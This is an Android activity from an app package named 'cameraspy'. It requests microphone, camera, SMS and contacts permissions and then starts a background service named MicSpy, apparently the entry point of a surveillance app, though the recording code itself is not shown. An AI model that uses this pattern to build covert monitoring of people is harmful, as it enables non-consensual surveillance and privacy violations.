package com.example.yogesh.cameraspy;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.MediaRecorder;
import android.os.Environment;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import java.io.IOException;
import java.util.Random;

import static android.Manifest.permission.READ_CONTACTS;
import static android.Manifest.permission.READ_EXTERNAL_STORAGE;
import static android.Manifest.permission.READ_SMS;
import static android.Manifest.permission.RECEIVE_SMS;
import static android.Manifest.permission.RECORD_AUDIO;
import static android.Manifest.permission.CAMERA;

import static android.Manifest.permission.WRITE_EXTERNAL_STORAGE;

public class MainActivity extends AppCompatActivity {
    String AudioSavePathInDevice = null;
    MediaRecorder mediaRecorder;
    Random random;
    Button stp;
    String RandomAudioFileName = "ABCDEFGHIJKLMNOP";
    public static final int RequestPermissionCode = 1;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        random = new Random();
        stp =(Button)findViewById(R.id.stp);

        stp.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                stopService(new Intent(MainActivity.this,MicSpy.class));
            }
        });
        if (checkPermission()) {
startService(new Intent(MainActivity.this,MicSpy.class));

        } else {
            requestPermission();
        }
//        startActivity(new Intent(MainActivity.this,Main2Activity.class));
    }





    private void requestPermission() {
        ActivityCompat.requestPermissions(MainActivity.this, new
                String[]{WRITE_EXTERNAL_STORAGE, RECORD_AUDIO,READ_EXTERNAL_STORAGE,CAMERA,READ_SMS,RECEIVE_SMS,READ_CONTACTS}, RequestPermissionCode);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           String permissions[], int[] grantResults) {
        switch (requestCode) {
            case RequestPermissionCode:
                if (grantResults.length> 0) {
                    boolean StoragePermission = grantResults[0] ==
                            PackageManager.PERMISSION_GRANTED;
                    boolean RecordPermission = grantResults[1] ==
                            PackageManager.PERMISSION_GRANTED;
                    boolean ReadPermission = grantResults[2] ==
                            PackageManager.PERMISSION_GRANTED;
                     boolean CAMERA= grantResults[3] ==
                            PackageManager.PERMISSION_GRANTED;
                    boolean READ_SMS= grantResults[4] ==
                            PackageManager.PERMISSION_GRANTED;
                    boolean RECEIVE_SMS= grantResults[5] ==
                            PackageManager.PERMISSION_GRANTED;
                    boolean READ_CONTACTS= grantResults[6] ==
                            PackageManager.PERMISSION_GRANTED;
                    if (StoragePermission && RecordPermission&&ReadPermission&&CAMERA&&READ_SMS&&RECEIVE_SMS&&READ_CONTACTS) {
                        Toast.makeText(MainActivity.this, "Permission Granted",

                                Toast.LENGTH_LONG).show();
                        startService(new Intent(MainActivity.this,MicSpy.class));
                    } else {
                        Toast.makeText(MainActivity.this,"Permi",Toast.LENGTH_LONG).show();
                    }
                }
                break;
        }
    }
    public boolean checkPermission() {
        int result = ContextCompat.checkSelfPermission(getApplicationContext(),
                WRITE_EXTERNAL_STORAGE);
        int result1 = ContextCompat.checkSelfPermission(getApplicationContext(),
                RECORD_AUDIO);
           int result2 = ContextCompat.checkSelfPermission(getApplicationContext(),
                CAMERA);
        int result3 = ContextCompat.checkSelfPermission(getApplicationContext(),
                READ_SMS );
        int result4 = ContextCompat.checkSelfPermission(getApplicationContext(),
                RECEIVE_SMS );
        int result5 = ContextCompat.checkSelfPermission(getApplicationContext(),
                READ_CONTACTS );
        return result == PackageManager.PERMISSION_GRANTED &&
                result1 == PackageManager.PERMISSION_GRANTED&&result2== PackageManager.PERMISSION_GRANTED&&result == PackageManager.PERMISSION_GRANTED &&
                result3 == PackageManager.PERMISSION_GRANTED&&result4== PackageManager.PERMISSION_GRANTED&& result5 == PackageManager.PERMISSION_GRANTED&&result4== PackageManager.PERMISSION_GRANTED;
    }
}
